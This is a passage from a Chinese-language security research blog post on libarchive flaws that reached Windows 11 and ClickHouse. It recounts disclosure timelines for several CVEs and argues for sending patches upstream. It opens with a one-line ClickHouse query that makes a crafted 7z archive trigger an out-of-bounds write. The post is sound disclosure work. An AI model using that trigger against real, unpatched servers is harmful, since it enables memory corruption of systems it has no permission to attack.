<p>並且觸發解壓縮：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM file('poc.7z :: **', RawBLOB)
</code></pre></div></div>

<p>就可以成功觸發越界寫漏洞了：
<img src="/assets/img/blog/20250212/65.png" alt="" /></p>

<p>我們最後透過 ClickHouse 在 Bugcrowd 上的賞金計劃進行回報：
<img src="/assets/img/blog/20250212/66.png" alt="" /></p>

<p>ClickHouse 很快的就進行了<a href="https://github.com/ClickHouse/ClickHouse/commit/c8a3a0bb11ad1344fbb50b10f50f8eb2a962aa7f">修復</a>，並且願意幫我們敦促 libarchive 進行漏洞的修補！雖然不確定微軟是否有告知 libarchive 的維護者們任何關於 CVE-2024-20696 與 CVE-2024-20697 的漏洞資訊（因為沒有任何公開資料，libarchive 在 GitHub repository 上的 <a href="https://github.com/libarchive/libarchive/security/advisories?state=draft">Security Advisories</a> 也沒有任何資料可以參考！）。但如同我們先前提到的，這兩個原先由微軟在 forked 版本的 libarchive 中發現的漏洞，最終 libarchive 也分別在五月跟四月獲得修復，結束了「Half-day」的尷尬狀況。</p>

<h3 id="持續追蹤">持續追蹤</h3>

<p>除了回報上述兩個「Half-day」之外，別忘了我們還有另外回報三個 0-day 漏洞，它們個別是：</p>

<ol>
  <li>微軟已經修復的 RCE：CVE-2024-26256
    <ul>
      <li>4/27 回報</li>
      <li>8/14 修補</li>
      <li>9/28 關閉</li>
    </ul>
  </li>
  <li>filter_audio 中的 oob read
    <ul>
      <li>3/20 回報</li>
      <li>4/29 修補</li>
      <li>9/28 關閉</li>
    </ul>
  </li>
  <li>filter_delta 中的 oob read
    <ul>
      <li>3/20 回報</li>
      <li>4/29 修補</li>
      <li>9/28 關閉</li>
    </ul>
  </li>
</ol>

<p>在回報後的數個月，他們終於獲得修復，這時已經是九月：
<img src="/assets/img/blog/20250212/67.png" alt="" /></p>

<h4 id="half-day-的迴環複沓">Half-day 的迴環複沓</h4>

<p>其中較嚴重的是我們已經回報給微軟的漏洞 CVE-2024-26256，微軟在四月時便已經修復：
<img src="/assets/img/blog/20250212/68.png" alt="" /></p>

<p>在三月回報漏洞的同時，我們有詢問 MSRC 是否會將 CVE-2024-26256 的 patch 提交到 libarchive 的 GitHub repository，第一時間沒有獲得回應。在微軟 patch CVE-2024-26256 之後我們又提問了一次，想確定他們是否有將該漏洞的資訊同步給 libarchive 的 maintainers，MSRC 說：「如果你願意的話，我們鼓勵你開一個獨立的 GitHub issue。」為了避免「Half-day」情況發生，所以我們也在收到訊息後馬上到 libarchive 的 Security Advisory 開了一個 issue：
<img src="/assets/img/blog/20250212/69.png" alt="" /></p>

<p>然而，「Half-day」還是發生了，因為太久沒有人回應。所以七月時，<a href="https://github.com/libarchive/libarchive/pull/2269">我們自己發了一個 PR </a>將微軟的 patch 移植過來，雖然不確定這個修補方式是不是最好的，但至少比沒有修補還要強。所以，歷史又重演了一次，從四月到修補完成的九月之間，我們又陷入了「Half-day」的情境。</p>

<h4 id="餘下的兩個-0-day">餘下的兩個 0-day</h4>

<p>眼尖的讀者或許已經注意到，我們所回報的 Security Advisory 並不是在「Published」的分頁中，而是「Closed」：
<img src="/assets/img/blog/20250212/70.png" alt="" /></p>

<p>除了剛才提到的 CVE-2024-26256 之外，其餘是兩個尚未申請 CVE 的越界讀取漏洞。針對已經有 CVE 編號的修補，人們會意識到這是一個關於安全性的修補。然而，由於其他兩個漏洞並不為人所知，僅修補卻不通知其他人安全風險的存在是一件危險的事情。尤其，libarchive 是一個廣泛使用的函式庫，有許許多多的軟體或服務使用它，導致人們並不知道自己正在使用 libarchive。這類軟體的相依鏈可能十分龐大且複雜，如果開發者或是終端使用者沒有意識到這是一個安全性的更新，那麼，該修補在整個相依鏈中將會極為緩慢地傳播，進而增加潛在風險。</p>

<p>所以，在確認 libarchive 將 issue 關閉之後我們就立即申請了 CVE 編號，這兩個漏洞分別是 <a href="https://github.com/advisories/GHSA-rmj4-vvpv-4m33">CVE-2024-48957</a> 與 <a href="https://github.com/advisories/GHSA-9mw4-2ppr-4mcg">CVE-2024-48958</a>，當它們被發佈時，已經是十月，距離修補發布的四月已經過去了六個月。</p>

<h2 id="結語">結語</h2>

<p>本文介紹了 Windows 在採用 libarchive 以支援更多壓縮檔案格式時，所引發的一些漏洞與有趣的特性。此外，我們也向 libarchive 回報了數個 0-day 漏洞。</p>

<p>接著，我們在 ClickHouse 上成功利用了我們認為介於 0-day 與 1-day 之間的「Half-day」漏洞。這源於 Windows 將 libarchive fork 出來後，將其編譯為閉源的 archiveint.dll，並在修補該 DLL 後，未能及時通知 libarchive 的維護者，或將修補程式回饋到 libarchive 上游，從而導致了「Half-day」漏洞的產生。</p>

<p>upstream 較晚獲得修補的原因，除了溝通延遲之外，也因缺乏公開可用的修補程式。維護者在 fork 版本已經完成修補後，才在接獲通報時開始著手解決問題。因此，微軟在修補 fork 版本的 libarchive 後，除了應主動通知原始維護者，更應直接提交 Pull Request (PR) 至上游，以協助完成修補。</p>

<p>libarchive 的維護者是一群志願者，而且可能沒有領取任何薪水。而開源精神便是人人皆可「分享、參與、行動」，因此我們認為，研究人員在漏洞回報的過程中，除了提供漏洞分析與 PoC 外，也應該積極的提出修補方案，共同維護開源軟體的安全性與品質。</p>


                    </div>
                    <!-- 文章內容 -->
                </div>
            </article>
            <!-- 文章 end -->
        </section>
        
         <!-- 作者 -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/blog/author/terrynini">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/nini.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/blog/author/terrynini">
                            <h3>Terrynini</h3>
                        </a>
                        <span>Security Researcher</span>
                        <p>
                            I’m NiNi, hunting the demons that lurk in your binary every day. <br>๛ฅ(=ˇωˇ=)ฅ
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

        <!-- 相關文章 -->
        <section class="recommand articles-list">
            <div class="container">
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                        <span class="tag">
    
                          <a href="/blog/tag/DEVCORE CONF/">#DEVCORE CONF</a> <a href="/blog/tag/Red Team/">#Red Team</a> <a href="/blog/tag/Active Directory/">#Active Directory</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/04/10/taking-over-the-entire-domain-in-minutes-what-have-you-overlooked-in-active-directory/">關於分分鐘拿下整個網域，你還疏忽了什麼？</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/xy">
                            <h3>XY</h3>
                        </a>
                    
                        <span class="date">2025-04-10</span>
                        <p class="line-litmit-3">本文分享我們在實戰上遇到 AD CS 的經驗以及特別的案例，並介紹 AD CS 的基本概念，希望讓企業與對 Active Directory 安全有興趣的讀者了解其重要性和潛在的風險。
                        </p>
                    </div>
                </article>
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                        <span class="tag">
    
                          <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/Advisory/">#Advisory</a> <a href="/blog/tag/CVE/">#CVE</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11/">全境擴散：從 Windows 11 到 Libarchive 的 Half-Day 威脅與全面影響</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/terrynini">
                            <h3>Terrynini</h3>
                        </a>
                    
                        <span class="date">2025-02-12</span>
                        <p class="line-litmit-3">Windows 11 的 KB5031455 更新讓檔案總管支援 RAR、7z 等格式，看似提升便利性，卻暗藏資安隱患。DEVCORE 研究組發現 libarchive 存在多個漏洞，包括 Heap Buffer Overflow、任意檔案寫入與刪除，而修補機制的延遲更導致「Half-day」攻擊風險。攻擊者可藉此影響如 ClickHouse 等廣泛使用 libarchive 的專案。Windows 真的變得更方便，還是埋下了更大的風險？
                        </p>
                    </div>
                </article>
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/最新消息">最新消息</a>
                        <span class="tag">
    
                          <a href="/blog/tag/公告/">#公告</a> <a href="/blog/tag/徵才/">#徵才</a> 
                        </span>
                        <h2>
                            <a href="/blog/2024/12/02/7th-internship-program-recruit/">DEVCORE 2025 第七屆實習生計畫</a> 
                        </h2>
                    
                    
                        <span class="date">2024-12-02</span>
                        <p class="line-litmit-3">DEVCORE 第七屆實習生計畫開始，計畫目的希望能培育人才、增強新世代的資安技能，如果您對這個計畫有興趣，歡迎來信報名！
                        </p>
                    </div>
                </article>
              

            </div>
        </section>
    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">服務</h6>
        <ul>
            <li><a href="/services/red-team/">紅隊演練</a></li>
            <li><a href="/services/penetration-test/">滲透測試</a></li>
            <li><a href="/services/security-consulting/">資安顧問服務</a></li>
            <li><a href="/services/security-training/">資安教育訓練</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">研究</h6>
        <ul>
            <li><a href="/research/overview/">總覽概要</a></li>
            <li><a href="/research/awards/">競賽與獎項</a></li>
            <li><a href="/research/bug-bounty/">企業漏洞回報</a></li>
            <li><a href="/research/talks/">國際研討會</a></li>
            <li><a href="/research/cve/">CVE 漏洞列表</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">公司</h6>
        <ul>
            <li><a href="/company/about/">公司簡介</a></li>
            <li><a href="/company/our-team/">團隊成員</a></li>
            <li><a href="/company/history/">成就與沿革</a></li>
            <li><a href="/company/csr/">企業社會責任</a></li>
            <li><a href="/company/jobs/">工作機會</a></li>
            <li><a href="/contact/">聯絡我們</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">新聞</h6>
        <ul>
            <li><a href="/blog/">BLOG</a></li>
            <li><a href="/media-kit/">媒體素材下載</a></li>
        </ul>
    </div>

    <!-- divider 分隔線 -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>© 2025 DEVCORE 戴夫寇爾股份有限公司. <b class="line-block">All rights reserved.</b></span>
            <span><a href="/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">中文</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>

